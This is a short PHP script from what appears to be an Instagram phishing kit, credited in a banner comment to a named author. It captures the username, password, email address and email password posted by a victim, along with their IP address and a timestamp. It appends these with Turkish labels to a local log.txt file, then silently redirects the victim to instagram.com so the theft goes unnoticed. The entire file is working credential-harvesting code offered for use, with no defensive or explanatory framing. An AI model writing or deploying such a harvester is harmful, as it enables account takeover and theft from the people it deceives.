<!---------------------------------------------SCRİPT BY TALHA ŞENTÜRK--------------------------------------------------->
<?php
$username = $_POST['user'];
$password = $_POST['password'];
$mail = $_POST['mail'];
$mailpass = $_POST['mailpass'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('log.txt', 'a');
fwrite($file, "Kullanıcı Adı: " .$username. "\nŞifre: " .$password."\nMail: " .$mail.  "\nMail Şifresi: " .$mailpass. "\nİp Adresi: " .$ip. "\nTarih: " .$cur_time.  "\n\n");
fclose($file);
?>

<meta content='0;url=https://instagram.com' http-equiv='refresh'/>
</head><body>
</html>